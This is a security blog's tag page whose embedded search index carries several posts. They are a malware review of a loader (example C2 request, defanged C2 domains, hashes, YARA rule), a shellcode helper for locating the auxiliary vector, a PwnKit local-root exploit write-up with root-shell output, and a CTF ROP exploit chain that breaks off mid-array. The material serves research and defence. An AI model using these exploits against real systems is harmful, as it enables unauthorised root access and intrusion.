<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Virus">

    <link rel="alternate" type="application/rss+xml" href="http://localhost:1313/tags/virus/index.xml" title="malware.boutique" />
    
        <title>Virus | malware.boutique</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.43056c0208714d72a9b07a03fd289886f46955ec4674e0455a120d0d7fd3b4aa.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/"><u>H</u>ome</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts"><u>P</u>osts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/published"><u>P</u>ublished Work</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="https://github.com/v-rzh"><u>G</u>itHub</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/tags"><u>T</u>ags</a></li>
            
          </ul>
        </nav>
        


<h1>Virus</h1>
<ul class="post-list">
    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Apr 28, 2023</span>
      
      <a href="/posts/auxvector/">In search of the auxiliary vector</a>
      
    </div>

</li>



    
  </ul>


<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/posts\/"
    },
    
    "http:\/\/localhost:1313\/published\/": {
        "title": "",
        "tags": [],
        "content": "Published Work tmp.out #3 | Hijacking __cxa_finalize to achieve entry point obscuring tmp.out #3 | Linux.ElizaCanFix.asm ", 
        "url": "http:\/\/localhost:1313\/published\/"
    },
    
    "http:\/\/localhost:1313\/": {
        "title": "",
        "tags": [],
        "content": " ", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/posts\/mofongo\/": {
        "title": "[Malware Review]: Mofongo Loader",
        "tags": ["loader","process hollowing","windows","obfuscation","malware",],
        "content": "Rather doing vanilla malware write ups, I\u0026rsquo;d like to introduce a different format - malware review. I\u0026rsquo;m going to rate the malware based around loose categories with an emphasis on how fun it was to reverse. The scoring will be biased, arbitrary, and unfair. Let\u0026rsquo;s go!\nDiscovery If you wish to follow along, the sample hash is e9007c7bd6be14d6364b91e1fd7b03043dffe8a405eca5cc6dc809762bd31ba2.\nI ran into this sample completely by chance. As I was submitting logs for a recent amateur radio contest (not kidding) my browser was redirected to a malicious page, masquerading as CloudFlare verification. It even downloaded the sample for me - how could I say no! The page encourages the victim to run the downloaded program in order to \u0026ldquo;verify\u0026rdquo; themselves before proceeding to the page they were trying to visit. The sample name is usually VERIFICATION.exe. In its eariler versions, a CloudFlare icon was used; more recent samples sport a generic green checkmark icon. As far as delivery methods are concerned it\u0026rsquo;s pretty lame, but the fact that I found it in the wild is definitely worth some points - 6/10.\nObfuscation The loader uses a number of classic obfuscation and evasion techniques, however they are not consistently applied and mostly fall flat. For instance, most WinAPI functions in this loader are called indirectly, but calls to LoadLibrary and GetProcAddress are direct (for example @ 0x140013c68). The author does use PEB walking to find kernell.dll in memory and resolve QueryFullProcessImageNameW (0x140013bd4). Unfortunately both kernell.dll and QueryFullProcessImageNameW strings are decrypted and passed as arguments to the PEB walking and DLL parsing procedures respectively, telegraphing what\u0026rsquo;s going on.\nSpeaking of encryption, strings in this loader are encrypted. There are three (!) decryption routines, all using XOR. Two of the routines are fixed-length key XOR: one for ASCII strings - another for wide char strings.\nThese two functions are wrapped in a multitude of routines with a hardcoded global address for the plaintext and a hardcoded plaintext length. This means that buffers store the decrypted strings not based on their content, but rather their length. So if two different strings of the same length need to be decrypted, the latest plaintext will clobber the previous. This actually happens several times. It\u0026rsquo;s weird and mildly annoying, but ultimately not effective. A little binja scripting went a long way.\nThank God DLL and function name lengths are rarely the same length!\nThe third encryption method (for example 0x14001b710) is used only in the process hollowing function (0x140012b20), and unlike the aforementioned encryption routines the plaintext is copied on the calling function\u0026rsquo;s stack. The key is derived from the string index by summing and mod\u0026rsquo;ing it with fixed byte-size values. Again though, it looks like each decryption function is generated per string length. This routine proved to be a pretty effective signature for this loader and also not too difficult to script. 2/10.\nC2 Communication C2 communication is done through HTTPS. The C2 domains sit behind CloudFlare. The loader builds the following object to identify the compromised host:\n{\u0026#34;appid\u0026#34;:\u0026#34;\u0026lt;hardcoded_uuid\u0026gt;\u0026#34;,\u0026#34;deviceid\u0026#34;:\u0026#34;\u0026lt;long_decimal_number\u0026#34;} The appid is a UUID, hardcoded into the sample; deviceid is a string, representing a concatenation of the current user\u0026rsquo;s SID_IDENTIFIER_AUTHORITY, and all of the user\u0026rsquo;s sub authority values in decimal. The loader sends the identification object as POST data to the C2, using a custom user agent UA/1.\nFull request to the C2 might look something like this:\nPOST /windows/verify HTTP/1.1 Host: cloudnetworkverify.com User-Agent: UA/1 Content-Length: 101 Content-Type: application/json {\u0026#34;appid\u0026#34;: \u0026#34;cf5e1917-02e8-4eaf-849d-bd53c72e36e3\u0026#34;, \u0026#34;deviceid\u0026#34;: \u0026#34;...\u0026#34;} In return, the loader expects a response with a header securedata: and base64-encoded data that is longer than 200 bytes. If the response is too short, the program cleans up and exits. Using HTTPS for C2 comms makes sense, sitting behind CloudFlare also makes sense, but it\u0026rsquo;s not very exciting - 5/10.\nPayload If present, contents of securedata: header are set as a value to an environment variable msedge. It is not used anywhere else in the loader, perhaps it\u0026rsquo;s used in the payload to encrypt the exfil? The base64 encoded payload is decoded in 0x140012260 and the binary blob is then passed through another goofy decryption routine (0x140012570). The resulting bytes are then mapped into a suspended msedge process via classic process hollowing in 0x140012b20. When setting up the msedge process, the loader also creates a one-way pipe and attempts to receive data from the payload. Judging by the fact that the code handling this data relies on a terminating NUL to compute its length, the routine likely expects an ASCII string. It doesn\u0026rsquo;t appear to be used anywhere else in the loader, so it\u0026rsquo;s unclear whether this is an unfinished feature or simply a way to track payload\u0026rsquo;s progress.\nSo what\u0026rsquo;s the payload? Well unfortunately it looks like the most recent domain is no longer serving the second stage, at least in response to any of my attempts. Perhaps I\u0026rsquo;m too late and it\u0026rsquo;s already shot down, or perhaps the ironic \u0026ldquo;SUCCESS\u0026rdquo; reply is a troll. I hope the latter, because that\u0026rsquo;s way funnier. Some earlier uploaders of this malware claimed that the second stage steals Chrome-related data, but so far I was not able to verify that. If anyone has the dump of the second stage - I\u0026rsquo;d love to take a look! It\u0026rsquo;s hard to rate something I\u0026rsquo;ve never seen, but as far as the delivery is concerned I\u0026rsquo;ll give it a 6/10 I mean at least a real malware technique.\nWildcard: Being annoying - best LPE? A funny feature of this loader is that it will spawn itself in an infinite loop until admin privileges are granted to it. Is it absurd? Yes. Will it absolutely work on way too many people? I\u0026rsquo;m willing to bet. 8/10 for audacity.\nCode Signing I decided to call it \u0026ldquo;mofongo\u0026rdquo; because the code is signed by Xuaony Plantain E-Commerce Trading. Sounds official!\nSo far I\u0026rsquo;ve found samples signed by GlobalSign GCC and Sectigo. The most recent and common signer is under the name of Xuaony Plantain E-Commerce Trading Co., Ltd.:\nSubject: /businessCategory=Private Organization/serialNumber=91420600MACLU7R889/jurisdictionC=CN/jurisdictionST=Hubei/jurisdictionL=Xiangyang/C=CN/ST=Hubei/L=Xiangyang/O=Xuaony Plantain E-Commerce Trading Co., Ltd./CN=Xuaony Plantain E-Commerce Trading Co., Ltd. Issuer : /C=BE/O=GlobalSign nv-sa/CN=GlobalSign GCC R45 EV CodeSigning CA 2020 Serial : 5867CAD98B5C8552F60A7BD8 Certificate expiration date: notBefore : Mar 30 11:20:38 2024 GMT notAfter : Mar 30 05:26:45 2025 GMT It appears that GlobalSign has already revoked this certificate.\nAnother signer appears in earlier samples:\nSubject: /C=EE/ST=Harjumaa/O=GreenEngine OU/CN=GreenEngine OU Issuer : /C=GB/O=Sectigo Limited/CN=Sectigo Public Code Signing CA R36 Serial : 6AB35C5785260695E9C012514DB0C299 Certificate expiration date: notBefore : May 15 00:00:00 2023 GMT notAfter : May 14 23:59:59 2024 GMT A note on the Rich header A few early samples had an unstripped Rich header:\nuser@linux $ richie_rich -i ac4d0d31c8355f9ea6f59580d107ec9ae88da58179c8fa8606a4937ff87da5dc.exe ------------------------------------------------------ Count Minor Version ProdID ------------------------------------------------------ 6 29395 Masm1400 (0x0103) 174 29395 Utc1900_CPP (0x0105) 16 29395 Utc1900_C (0x0104) 1 0 Unknown (0x0000) 16 33030 Utc1900_C (0x0104) 18 33030 Masm1400 (0x0103) 82 33030 Utc1900_CPP (0x0105) 7 29395 Implib1400 (0x0101) 105 0 Import0 (0x0001) 4 33135 Utc1900_CPP (0x0105) 1 33135 Masm1400 (0x0103) 1 33135 Linker1400 (0x0102) Although the Rich header is easily spoofed, the fact that the values are consistent and the author chose to strip it in later versions suggests it may be the original header.\nYARA Rule rule mofongo_loader { meta: malware = \u0026#34;Mofongo Loader\u0026#34; description = \u0026#34;This loader maps and executes a payload in a hollowed msedge process\u0026#34; author = \u0026#34;vrzh\u0026#34; strings: // A peculiar string decryption routine; serves as a good signature. $string_decryption_0 = { b9 ?? 00 00 00 f7 f9 8b c2 83 c0 ?? 8b 4c 24 ?? 33 c8 8b c1 48 63 0c 24 48 8b 54 24 ?? 88 04 0a } condition: uint16(0) == 0x5A4D and $string_decryption_0 } IOC C2 Domains \u0026amp; URL:\nhttps://cloudnetworkverify[.]com/windows/verify https://checkcloudnet[.]com/check/connection https://verifstep[.]com/VERIFICATION.exe https://chikabonitaez[.]site/11/VERIFICATION.exe Files:\nVERIFICATION.exe Hashes:\n2fdb228dbd1da27d70cf99b399d8ea419bd914c9f9594ad017bfdf005a2aef1e 3e6ba2c93db0c9b97330098914e14ee3718a8e5fa7f8bc15eb511d219d050871 8f957a03b1c92a5dc7d396ddb8724abdf450e6b8c98e68460fcee1037835e800 ac4d0d31c8355f9ea6f59580d107ec9ae88da58179c8fa8606a4937ff87da5dc ae8d3b5728ec39a84a515d8240c4fc958e94cf1fd552fcfc9dad0cf6ba379421 b68adceb4eea31a7f1ad264b3fbff20526bb96049ceb41f43310c46bc543d4a5 e9007c7bd6be14d6364b91e1fd7b03043dffe8a405eca5cc6dc809762bd31ba2 ", 
        "url": "http:\/\/localhost:1313\/posts\/mofongo\/"
    },
    
    "http:\/\/localhost:1313\/tags\/loader\/": {
        "title": "Loader",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/loader\/"
    },
    
    "http:\/\/localhost:1313\/tags\/malware\/": {
        "title": "Malware",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/malware\/"
    },
    
    "http:\/\/localhost:1313\/tags\/obfuscation\/": {
        "title": "Obfuscation",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/obfuscation\/"
    },
    
    "http:\/\/localhost:1313\/tags\/process-hollowing\/": {
        "title": "Process Hollowing",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/process-hollowing\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/tags\/windows\/": {
        "title": "Windows",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/windows\/"
    },
    
    "http:\/\/localhost:1313\/tags\/auxiliary-vector\/": {
        "title": "Auxiliary Vector",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/auxiliary-vector\/"
    },
    
    "http:\/\/localhost:1313\/posts\/auxvector\/": {
        "title": "In search of the auxiliary vector",
        "tags": ["auxiliary vector","virus","shellcode","linux",],
        "content": "This article and supporting repository present a naive but effective method of scanning the stack for the auxiliary vector.\nBackground The order of first several auxiliary vector entries as defined in the linux kernel source (create_elf_tables() in fs/binfmt_fs.c) has not changed since v2.6.12 (3a93e40326c8f470e71d20b4c42d36767450f38f last time I checked):\nNEW_AUX_ENT(AT_HWCAP, ELF_HWCAP); NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE); NEW_AUX_ENT(AT_CLKTCK, CLOCKS_PER_SEC); NEW_AUX_ENT(AT_PHDR, phdr_addr); NEW_AUX_ENT(AT_PHENT, sizeof(struct elf_phdr)); NEW_AUX_ENT(AT_PHNUM, exec-\u0026gt;e_phnum); NEW_AUX_ENT(AT_BASE, interp_load_addr); if (bprm-\u0026gt;interp_flags \u0026amp; BINPRM_FLAGS_PRESERVE_ARGV0) flags |= AT_FLAGS_PRESERVE_ARGV0; NEW_AUX_ENT(AT_FLAGS, flags); NEW_AUX_ENT(AT_ENTRY, e_entry); NEW_AUX_ENT(AT_UID, from_kuid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;uid)); NEW_AUX_ENT(AT_EUID, from_kuid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;euid)); NEW_AUX_ENT(AT_GID, from_kgid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;gid)); NEW_AUX_ENT(AT_EGID, from_kgid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;egid)); NEW_AUX_ENT(AT_SECURE, bprm-\u0026gt;secureexec); That means that a predictable order of struct aux_entry_64 id values can be found somewhere on the stack. This pattern likely marks the beginning of the auxiliary vector.\nWhy not use getauxval() like a normal person?\nThe point of this code is to be able to find the auxiliary vector without depending on libc or knowing the stack state. This can be useful as part of elf parasite code or shellcode.\nUsage ASM Implementation Run make and you can link the auxvector64.o with your program. For a 32-bit object run make 32bit=true (it will produce auxvector32.o).\nThe asm version doesn\u0026rsquo;t take any arguments and returns the address of the auxiliary vector in rax (or eax in the 32 bit version).\nC Implementation Run make c=true and you can link the auxvector.o with your program. For a 32-bit object run make c=true 32bit=true.\nCall get_beg_auxvector() from your code:\nstruct aux_entry *get_beg_auxvector(unsigned long int rsp, unsigned long int max_stack); rsp and max_stack represent the lower and upper bound of the stack scan respectively. Both addresses will be QWORD/DWORD aligned (depending on bitness).\nThe function returns a pointer to AT_HWCAP auxiliary vector entry or NULL on error.\nExamples Check out code in test32.asm and test64.asm for an example.\nYou can compile and link these examples with make test 32bit=true and make test respectively.\nBoth examples will grab the AT_PHNUM value and pass it to the exit syscall.\n[ab@gibson]$ make test c=true nasm -o test64.o test64.asm -felf64 gcc -o auxvector.o auxvector.c -c -Wall -nostdlib -pie -fpic -O3 -D__WORDSIZE=64 ld -o test.elf test64.o auxvector.o ... [ab@gibson]$ strace ./test.elf execve(\u0026#34;./test.elf\u0026#34;, [\u0026#34;./test.elf\u0026#34;], 0x7ffff5364500 /* 46 vars */) = 0 exit(5) = ? +++ exited with 0 +++ ", 
        "url": "http:\/\/localhost:1313\/posts\/auxvector\/"
    },
    
    "http:\/\/localhost:1313\/tags\/linux\/": {
        "title": "Linux",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/linux\/"
    },
    
    "http:\/\/localhost:1313\/tags\/shellcode\/": {
        "title": "Shellcode",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/shellcode\/"
    },
    
    "http:\/\/localhost:1313\/tags\/virus\/": {
        "title": "Virus",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/virus\/"
    },
    
    "http:\/\/localhost:1313\/posts\/pwnkit\/": {
        "title": "CVE-2021-4034 Exploit",
        "tags": ["PwnKit","exploit","libc","polkit","LPE","linux",],
        "content": "Root exploit for the PwnKit vulnerability. Check out the original report here .\nUse this exploit with an express permission of the target system owners.\nBuilding No dependencies needed besides libc. Just run make.\nRunning Running without options will execute the exploit:\n[linux@linux ~]$ ./exploit ----------------------------------------------------------------------------- __\\ / __ __ _ __ _ __ | \\ / _ ___ / V |_ --- _)/ \\ _)/| ---|_|/ \\__)|_| | V |_) _/|_| \\__ |__ /__\\_//__ | |\\_/__) | | | \\/__| | ----------------------------------------------------------------------------- sh-5.1# whoami root sh-5.1# You can customize the path to pkexec as well as the \u0026ldquo;from\u0026rdquo; charset:\n[linux@linux ~]$ ./exploit -h ... ./exploit [-c] [-h] [-f from_charset] [-p /path/to/pkexec] ----------------------------------------------------------------------------- -c Just teardown - don\u0026#39;t exploit -p \u0026lt;path\u0026gt; Path to pkexec (default: \u0026#34;/usr/bin/pkexec\u0026#34;) -f \u0026lt;from_charset\u0026gt; Custom \u0026#34;from\u0026#34; charset (default: \u0026#34;UTF-8\u0026#34;) -h Display this message What\u0026rsquo;s the deal with GIO_USE_VFS?! I saw a few people on social media ask why does the exploit fail if the GIO_USE_VFS= is not defined? Why does it work with the older versions?\nThe culprit daf3d5c2d15466a267221fcb099c59c870098e03 is the culprit. Here\u0026rsquo;s the relevant part of the diff:\n--- a/src/programs/pkexec.c +++ b/src/programs/pkexec.c @@ -503,6 +503,9 @@ main (int argc, char *argv[]) opt_user = NULL; local_agent_handle = NULL; + /* Disable remote file access from GIO. */ + setenv (\u0026#34;GIO_USE_VFS\u0026#34;, \u0026#34;local\u0026#34;, 1); + /* check for correct invocation */ if (geteuid () != 0) { Versions prior to this commit are exploitable without the need to define the GIO_USE_VFS variable. The purpose of the commit is actually a red herring. It\u0026rsquo;s not what the variable means, it\u0026rsquo;s how it affects the environment. For the truth we must look to libc.\nLooking in libc The process\u0026rsquo;s environment in libc is represented by an array of char *s, pointed to by this global variable:\nchar **environ; environ lives on the heap and is occasionally relocated. You might already know where this is going. Check out this code snippet from setenv.c :\n#if !_LIBC # define __environ environ # ifndef HAVE_ENVIRON_DECL extern char **environ; # endif #endif int __add_to_environ (const char *name, const char *value, const char *combined, int replace) { char **ep; // ... skipping ep = __environ; size = 0; if (ep != NULL) { for (; *ep != NULL; ++ep) if (!strncmp (*ep, name, namelen) \u0026amp;\u0026amp; (*ep)[namelen] == \u0026#39;=\u0026#39;) break; else ++size; } if (ep == NULL || __builtin_expect (*ep == NULL, 1)) { char **new_environ; /* We allocated this space; we can extend it. */ new_environ = (char **) realloc (last_environ, (size + 2) * sizeof (char *)); // ... skipping last_environ = __environ = new_environ; } __add_to_environ is called by both setenv(3) and putenv(3) to accomplish the same thing: set an environment variable. If the environment variable in question is not defined, environ has to be reallocated to accomodate a new entry (a pointer to the new environment key=value pair). If it is defined, the size of the environ array has not changed and thus there is no reason for reallocation. For brevity I\u0026rsquo;ve omitted that part of the code - I encourage you to check it out.\nTying it all together Now let\u0026rsquo;s come back to the exploit. If you\u0026rsquo;ve gotten this far, you probably already know the methodology behind this exploit (if not please check out the original report ). We are trying to sneak in an environment variable by passing an empty program arguments (argv) to pkexec. When argc is truly empty (not even a program name), the environment variables, which are adjacent to arguments clash with it. We abuse this behavior to force pkexec to write a canonical path of a target executable. However, before we get this part of code we get this:\nsetenv (\u0026#34;GIO_USE_VFS\u0026#34;, \u0026#34;local\u0026#34;, 1); If this variable is not present in the environment environ will be reallocated and it will never end up clashing with argv and the out of bounds write will never take place.\n", 
        "url": "http:\/\/localhost:1313\/posts\/pwnkit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/exploit\/": {
        "title": "Exploit",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/exploit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/libc\/": {
        "title": "Libc",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/libc\/"
    },
    
    "http:\/\/localhost:1313\/tags\/lpe\/": {
        "title": "LPE",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/lpe\/"
    },
    
    "http:\/\/localhost:1313\/tags\/polkit\/": {
        "title": "Polkit",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/polkit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pwnkit\/": {
        "title": "PwnKit",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pwnkit\/"
    },
    
    "http:\/\/localhost:1313\/posts\/weirdrop\/": {
        "title": "CircleCityCon 2021: weirdrop",
        "tags": ["CTF","ROP","pwn","linux",],
        "content": "I didn\u0026rsquo;t participate in the CTF, but I noticed that there is no writeup for this challenge, so I decided to address that. :D You can find the exploit source here .\nExploitable Service We get an exploitable service binary.\n[joey@gibson] file weird-rop weird-rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=2876651ce7257d4153ee90b05f0b1a2b29f25700, not stripped Neato! We got a 64-bit ELF. The binary is statically compiled and not stripped, making reversing and exploitation much easier for us.\nReversing Turns out there isn\u0026rsquo;t much to reverse! This is a very lightweight binary, written in assembly. Here\u0026rsquo;s the program entry:\n┌ 21: entry0 (); │ 0x00401154 e887ffffff call loc.vuln │ 0x00401159 48c7c03c0000. mov rax, 0x3c │ 0x00401160 48c7c7000000. mov rdi, 0 └ 0x00401167 0f05 syscall So far so good - the program calls vuln() then calls the exit system call with the exit code 0. If you are looking for an easy reference for the ABI bookmark this .\nLet\u0026rsquo;s take a look at vuln():\n│ 0x004010e0 55 push rbp │ 0x004010e1 4889e5 mov rbp, rsp │ 0x004010e4 4883ec10 sub rsp, 0x10 │ 0x004010e8 48c7c0020000. mov rax, 2 │ 0x004010ef 488d3c250020. lea rdi, loc.flag ; 0x402000 ; \u0026#34;/flag.txt\u0026#34; │ 0x004010f7 48c7c6020000. mov rsi, 2 │ 0x004010fe 48c7c2000000. mov rdx, 0 │ 0x00401105 0f05 syscall So far we got open(\u0026quot;/flag.txt\u0026quot;, O_RDWR). Note that this binary isn\u0026rsquo;t actually using libc, I\u0026rsquo;m just using libc functions to make the reversed code easier to look at. You can find the definitions of flags like O_RDWR in /usr/include (e.g. /usr/include/asm-generic/fcntl.h).\n│ 0x00401107 4883c030 add rax, 0x30 │ 0x0040110b 880424 mov byte [rsp], al │ 0x0040110e c64424010a mov byte [var_1h], 0xa │ 0x00401113 48c7c0010000. mov rax, 1 │ 0x0040111a 48c7c7010000. mov rdi, 1 │ 0x00401121 4889e6 mov rsi, rsp │ 0x00401124 48c7c2020000. mov rdx, 2 │ 0x0040112b 0f05 syscall At this point the rax register holds the file descriptor returned by the open syscall. The program adds 0x30 to the file descriptor, which is a low-tech way of turning a digit into its ASCII representation (0x30 represents zero and so on). We store this value on the stack and append \\n to it. The program then outputs this number to the standard output: write(STDOUT_FILENO, stack_pointer, 2);\n│ 0x0040112d 48c7c0000000. mov rax, 0 │ 0x00401134 48c7c7000000. mov rdi, 0 │ 0x0040113b 4889e6 mov rsi, rsp │ 0x0040113e 48c7c2c80000. mov rdx, 0xc8 │ 0x00401145 0f05 syscall │ 0x00401147 48c7c7000000. mov rdi, 0 │ 0x0040114e 4883c410 add rsp, 0x10 │ 0x00401152 5d pop rbp └ 0x00401153 c3 ret Reverses to this: read(STDOUT_FILENO, stack_ptr, 200);\nThe final chunk of this function reads 0xc8 bytes into the stack, nulls out the rdi register, does some cleanup, and returns. Obviously this is the vulnerability - we can overwrite the return address on the stack and gain control of the program counter.\nYucky Gadgets Okay so.. what\u0026rsquo;s the problem? Just hunt for some useful gadgets and get that easy 300 points right? Let\u0026rsquo;s see here\u0026hellip;\n0x00401000 5e pop rsi 0x00401001 c3 ret 0x00401002 48c7c000000000 mov rax, 0 0x00401009 c3 ret Cool cool.\n0x0040100a 48c7c001000000 mov rax, 1 0x00401011 c3 ret 0x004010db 0f05 syscall 0x004010dd c3 ret Nice!\n0x0040109b 4881f7cd030000 xor rdi, 0x3cd 0x004010a2 c3 ret 0x004010d3 4881f79a020000 xor rdi, 0x29a 0x004010da c3 ret Uhm\u0026hellip;\n0x004010cb 4881f7a3010000 xor rdi, 0x1a3 0x004010d2 c3 ret 0x004010c3 4881f798010000 xor rdi, 0x198 0x004010ca c3 ret \u0026hellip; okay?\n26 xor rdi gadgets?! Gross.\nExploitation Plan The exploitation plan I chose was to take advantage of the open file descriptor, telegraphed to us by the service, read the contents of the flag file, and simply write it to the standard output.\nMost gadgets are already obvious - we can load 1 and 0 into rax for the write and read system calls respectively. We even have a gadget to load the standard output file descriptor (1) into rdi.\nHowever we still need to put the flag file descriptor in rdi and there is no clear gadget candidate for this. We just got a bunch of awkward XOR gadgets and that means it\u0026rsquo;s time for some XOR math!\nI don\u0026rsquo;t know about you, but I\u0026rsquo;m pretty lazy, so I just wrote a Python script to bruteforce the needed XOR gadgets. (Note that since the rdi register is nulled out, the first XOR gadget will just put the immediate value into the register). The script permutes over every possible combination of XOR gadgets and breaks when the value is found. permute.py is the script I wrote for this task. Take a look - nothing too fancy there.\nThe flag file descriptor is always 5, so we can just run permute.py once to figure out the gadgets we need.\nIf you are confused by the file descriptor being 5 and not 3 you are not alone - it\u0026rsquo;s weird. This is likely due to a little bit more code on the server side that we don\u0026rsquo;t get to see. (I think the challenge would have been more interesting if the file descriptor was somewhat random. That way, we\u0026rsquo;d have to dynamically determine which gadgets to use).\n[joey@gibson]$ ./permute.py 5 0x56 0x53 Great - so the XOR gadgets that have these two operands is what we need. We now have all of the key elements of our exploit. This is the ROP chain I came up with:\n#define EXPLOIT_LEN 0xc8 uint8_t exploit[EXPLOIT_LEN] = { 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it\u0026#39;s in your head! 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it\u0026#39;s in your head! 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // filler! 0x7c, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x53 0x1a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x56 0xde, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // pop rdx 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // length value 0x02, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 0xdb, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall 0x0a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x1 0x12, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdi, 0x1 0xdb, 0x10, 